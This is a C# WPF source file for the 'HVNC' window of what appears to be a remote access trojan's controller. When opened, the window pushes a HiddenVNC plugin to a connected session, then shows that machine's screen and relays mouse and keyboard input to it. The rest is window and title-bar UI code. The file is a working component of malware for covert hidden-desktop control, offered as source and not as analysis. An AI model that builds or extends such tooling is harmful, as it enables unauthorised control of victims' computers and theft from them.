using Common.DTOs.MessagePack;
using Server.CoreServerFunctionality;
using Server.UtilityWindows.Interface;
using System;
using System.Collections.Concurrent;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Media.Animation;
using System.Windows.Media.Imaging;

namespace Server.UtilityWindows
{
    public partial class HVNC :Window, IUtilityWindow,IDisposable
    {
        ServerSession _session;

        BlockingCollection<byte[]> frameBuffer = new();
        CancellationTokenSource _cancellationTokenSource = new CancellationTokenSource();
        public HVNC(ServerSession session)
        {
            _session = session;
            InitializeComponent();

            triggerd = (FindResource("ControlPanel_Triggered") as Storyboard);
            default_Down = (FindResource("ControlPanel_Default_Down") as Storyboard);
            default_Up = (FindResource("ControlPanel_Default_Up") as Storyboard);
            _session.OnHVNC += HandlePacket;
            _session.SendPlugin(typeof(HiddenVNC.Plugin));
            FrameLoop();

        }

        private void HandlePacket(object? sender, EventArgs e)
        {
            var dto = (HVNCDTO)sender;

            if(dto.Frame != null)
            {
                frameBuffer.Add(dto.Frame);
            }

        }

        Task frameReaderTasl = Task.CompletedTask;
        MemoryStream ms = new MemoryStream();
        private void FrameLoop()
        {
            frameReaderTasl = Task.Run(async() =>
            {
                while (!_cancellationTokenSource.Token.IsCancellationRequested)
                {
                    byte[] buffer = frameBuffer.Take();
                    await ms.WriteAsync(buffer);

                    Bitmap bmp = new Bitmap(ms);

                    await Application.Current.Dispatcher.InvokeAsync(async () =>
                    {
                        frame.Source = await ToImageSource(bmp);
                    });

                    ms.SetLength(0);
                }
            });

        }

        MemoryStream memory = new MemoryStream();
        private async Task<BitmapImage> ToImageSource(Bitmap bmp)
        {
            memory.SetLength(0);
            bmp.Save(memory, System.Drawing.Imaging.ImageFormat.Bmp);
            memory.Position = 0;
            var bitmapImage = new BitmapImage();
            bitmapImage.BeginInit();
            bitmapImage.StreamSource = memory;
            bitmapImage.CacheOption = BitmapCacheOption.OnLoad;
            bitmapImage.EndInit();
            return bitmapImage;

        }


        private async void frame_MouseWheel(object sender, MouseWheelEventArgs e)
        {
            var pos = e.GetPosition(frame);
            double xFac = pos.X / frame.ActualWidth;
            double yFac = pos.Y / frame.ActualHeight;
            await _session.SendPacketAsync(new HVNCDTO()
            {
                xFactor = xFac,
                yFactor = yFac,
                scrollDelta = e.Delta
            });
           
        }

        public enum MouseButton
        {
            Right=1,
            Left,
        }

        private async void frame_MouseDown(object sender, MouseButtonEventArgs e)
        {
            var pos = e.GetPosition(frame);
            double xFac = pos.X / frame.ActualWidth;
            double yFac = pos.Y / frame.ActualHeight;

            int mousebutton = 1;

            if(e.ChangedButton == System.Windows.Input.MouseButton.Left)
            {
                mousebutton=(int)MouseButton.Left;
            }else if (e.ChangedButton == System.Windows.Input.MouseButton.Right)
            {
                mousebutton = (int)MouseButton.Right;
            }

            await _session.SendPacketAsync(new HVNCDTO()
            {
                IsPressed = true,
                MouseButton = mousebutton,
                xFactor = xFac,
                yFactor = yFac,
            });
        }

        private async void frame_MouseUp(object sender, MouseButtonEventArgs e)
        {
            var pos = e.GetPosition(frame);
            double xFac = pos.X / frame.ActualWidth;
            double yFac = pos.Y / frame.ActualHeight;

            int mousebutton = 1;

            if (e.ChangedButton == System.Windows.Input.MouseButton.Left)
            {
                mousebutton = (int)MouseButton.Left;
            }
            else if (e.ChangedButton == System.Windows.Input.MouseButton.Right)
            {
                mousebutton = (int)MouseButton.Right;
            }

            await _session.SendPacketAsync(new HVNCDTO()
            {
                IsPressed = false,
                MouseButton = mousebutton,
                xFactor = xFac,
                yFactor = yFac,
            });
        }

        private async void frame_KeyDown(object sender, KeyEventArgs e)
        {
            await _session.SendPacketAsync(new HVNCDTO()
            {
                IsPressed = true,
                Char = GetCurrentKeyChar().ToString()
            });

          
            e.Handled = true;
        }

        private async void frame_KeyUp(object sender, KeyEventArgs e)
        {
            await _session.SendPacketAsync(new HVNCDTO()
            {
                IsPressed = false,
                Char = GetCurrentKeyChar().ToString()
            });
            e.Handled = true;
        }

        private async void frame_MouseMove(object sender, MouseEventArgs e)
        {
            var pos = e.GetPosition(frame);
            double xFac = pos.X / frame.ActualWidth;
            double yFac = pos.Y / frame.ActualHeight;

            await _session.SendPacketAsync(new HVNCDTO()
            {
                xFactor = xFac,
                yFactor = yFac,
            });
        }

        [DllImport("user32.dll")]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        private static extern int ToUnicode(
            uint wVirtKey,
            uint wScanCode,
            byte[] lpKeyState,
            [Out, MarshalAs(UnmanagedType.LPWStr, SizeParamIndex = 4)]
        StringBuilder pwszBuff,
            int cchBuff,
            uint wFlags);

        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        private const int VK_SHIFT = 0x10;
        private const int VK_CONTROL = 0x11;
        private const int VK_MENU = 0x12; // Alt key



        static char GetCurrentKeyChar()
        {
            byte[] keyboardState = new byte[256];
            GetKeyboardState(keyboardState);

            for (int vk = 0; vk < 256; vk++)
            {
                // Check if key is pressed
                if ((keyboardState[vk] & 0x80) != 0)
                {
                    uint scanCode = MapVirtualKey((uint)vk, 0);
                    StringBuilder result = new StringBuilder(2);

                    int count = ToUnicode((uint)vk, scanCode, keyboardState, result, result.Capacity, 0);
                    if (count > 0)
                    {
                        return result[0];
                    }
                }
            }
            return '\0'; // No key is pressed
        }

        public void Dispose()
        {
            _cancellationTokenSource.Cancel();
            frameBuffer.Dispose();
            Task.WaitAll(frameReaderTasl);

        }



        #region frontend
        private bool isDragging = false;
        private System.Windows.Point clickPosition;
        Storyboard triggerd;
        Storyboard default_Down;
        Storyboard default_Up;
        private void ControlPanel_TBTN_RightMouseDown(object sender, MouseButtonEventArgs e)
        {
            if (e.RightButton == System.Windows.Input.MouseButtonState.Pressed)
            {
                isDragging = true;
                clickPosition = e.GetPosition(this);
                (sender as ToggleButton).CaptureMouse();
            }
        }

        private void ControlPanel_TBTN_MouseMove(object sender, MouseEventArgs e)
        {
            if (isDragging)
            {
                System.Windows.Point currentPosition = e.GetPosition(this);
                double deltaY = currentPosition.Y - clickPosition.Y;

                if (currentPosition.Y < this.ActualHeight / 2)
                {
                    if (ControlPanel_Grid.VerticalAlignment != VerticalAlignment.Top)
                    {
                        ControlPanel_TBTN.IsChecked = false;
                        ControlPanel_Grid.VerticalAlignment = VerticalAlignment.Top;
                        BeginStoryboard((Storyboard)this.Resources["up"]);
                    }
                }
                else
                {
                    if (ControlPanel_Grid.VerticalAlignment != VerticalAlignment.Bottom)
                    {
                        ControlPanel_TBTN.IsChecked = false;
                        ControlPanel_Grid.VerticalAlignment = VerticalAlignment.Bottom;
                        BeginStoryboard((Storyboard)this.Resources["down"]);
                    }
                }
            }
        }

        private void ControlPanel_TBTN_RightMouseUp(object sender, MouseButtonEventArgs e)
        {
            if (isDragging)
            {
                isDragging = false;
                (sender as ToggleButton).ReleaseMouseCapture();
            }
        }

        private void ControlPanel_TBTN_Checked(object sender, RoutedEventArgs e)
        {
            triggerd.Begin();
        }

        private void ControlPanel_TBTN_Unchecked(object sender, RoutedEventArgs e)
        {
            if (ControlPanel_Grid.VerticalAlignment == VerticalAlignment.Top)
            {
                default_Up.Begin();
            }

            if (ControlPanel_Grid.VerticalAlignment == VerticalAlignment.Bottom)
            {
                default_Down.Begin();
            }
        }

        private void Window_PreviewMouseDown(object sender, MouseButtonEventArgs e)
        {
            // Kolla om klicket var utanför ToggleButton och Border
            if (!IsClickInsideElement(screenControl_TBTN, e) && !IsClickInsideElement(screenControl, e))
            {
                screenControl_TBTN.IsChecked = false;
            }
            if (!IsClickInsideElement(randomControl_TBTN, e) && !IsClickInsideElement(randomControl, e))
            {
                randomControl_TBTN.IsChecked = false;
            }
        }

        private bool IsClickInsideElement(FrameworkElement element, MouseButtonEventArgs e)
        {
            if (element == null)
            {
                return false;
            }

            System.Windows.Point clickPosition = e.GetPosition(element);
            return clickPosition.X >= 0 && clickPosition.X <= element.ActualWidth &&
                   clickPosition.Y >= 0 && clickPosition.Y <= element.ActualHeight;
        }

        #endregion
        #region TitleBar
        private bool isDraggingFromMaximized = false;
        private System.Windows.Point startDragPoint;

        private void TitleBar_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            var window = Window.GetWindow(this) as Window;
            if (e.ClickCount == 2)
            {
                MaximizeButton_Click(sender, e);
            }
            else
            {
                if (window != null && window.WindowState == WindowState.Maximized)
                {
                    isDraggingFromMaximized = true;
                    startDragPoint = e.GetPosition(this);
                }
                else
                {
                    window?.DragMove();
                }
            }
        }

        private void TitleBar_MouseMove(object sender, MouseEventArgs e)
        {
            if (isDraggingFromMaximized)
            {
                var window = Window.GetWindow(this) as Window;
                if (window == null) return;

                System.Windows.Point currentPoint = e.GetPosition(this);

                if (e.LeftButton ==System.Windows.Input.MouseButtonState.Pressed &&
                    (Math.Abs(currentPoint.X - startDragPoint.X) > 10 || Math.Abs(currentPoint.Y - startDragPoint.Y) > 10))
                {
                    isDraggingFromMaximized = false;
                    window.WindowState = WindowState.Normal;

                    var mousePosition = e.GetPosition(window);
                    window.Left = mousePosition.X - (startDragPoint.X * window.RestoreBounds.Width / ActualWidth);
                    window.Top = mousePosition.Y - (startDragPoint.Y * window.RestoreBounds.Height / ActualHeight);
                    window.DragMove();
                }
            }
        }

        private void TitleBar_MouseLeftButtonUp(object sender, MouseButtonEventArgs e)
        {
            isDraggingFromMaximized = false;
        }

        private void MinimizeButton_Click(object sender, RoutedEventArgs e)
        {
            var window = Window.GetWindow(this);
            if (window != null)
            {
                window.WindowState = WindowState.Minimized;
            }
        }

        private void MaximizeButton_Click(object sender, RoutedEventArgs e)
        {
            var window = Window.GetWindow(this);
            if (window != null)
            {
                window.WindowState = window.WindowState == WindowState.Maximized ? WindowState.Normal : WindowState.Maximized;
            }
        }

        private void CloseButton_Click(object sender, RoutedEventArgs e)
        {
            var window = Window.GetWindow(this);
            window?.Close();
        }

      
        #endregion

    }
}
